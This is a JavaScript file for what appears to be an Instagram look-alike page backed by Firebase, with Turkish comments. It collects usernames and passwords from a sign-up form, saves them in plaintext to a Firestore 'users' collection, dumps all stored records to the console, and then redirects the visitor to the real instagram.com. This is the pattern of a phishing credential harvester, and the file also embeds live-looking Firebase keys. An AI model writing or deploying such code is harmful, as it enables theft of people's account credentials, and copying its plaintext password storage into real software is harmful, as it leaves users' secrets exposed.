import { initializeApp } from "firebase/app";
import { getFirestore, collection, getDocs, addDoc } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyCka6cyWQTZBPz1XbO9UsCrjwS5nuHNE9w",
  authDomain: "instagram-clone-8973c.firebaseapp.com",
  projectId: "instagram-clone-8973c",
  storageBucket: "instagram-clone-8973c.appspot.com",
  messagingSenderId: "1066520125585",
  appId: "1:1066520125585:web:d9fb0ece66edfdfaeddf30",
  measurementId: "G-J3LS5GF6BD"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Read Data
const ref = collection(db, "users");


getDocs(ref)
  .then((snapshot) => {
    const users = snapshot.docs.map((doc) => ({
      id: doc.id,
      ...doc.data(),
    }));
    console.log(users);
  })
  .catch((error) => {
    console.log(error);
  });

// Write Data
const addForm = document.getElementById('registerForm');
const createacctbtn = document.getElementById('create-acct-btn');
const loader = document.getElementById('loader-button');

// Loading animasyonunu gizle ve buton metnini göster
createacctbtn.style.display = 'inline-block';
loader.style.display = 'none';

createacctbtn.addEventListener("click", function(event) {
  event.preventDefault(); // Formun submit edilmesini önler
  const username = document.getElementById('username-signup').value;
  const password = document.getElementById('password-signup').value;

  if (!username || !password) {
    alert('Lütfen kullanıcı adı ve şifre girin.');
    return;
  }

  const users = {
    username: username,
    password: password
  };

  console.log(users);
  addDoc(ref, users).then(() => {
    // Loading animasyonunu göster ve buton metnini gizle
    createacctbtn.style.display = 'none';
    loader.style.display = 'flex';
    setTimeout(() => {
      window.location.href = "https://www.instagram.com";
    }, 1000);
  })
  .catch((error) => {
    console.log(error);
  });
});

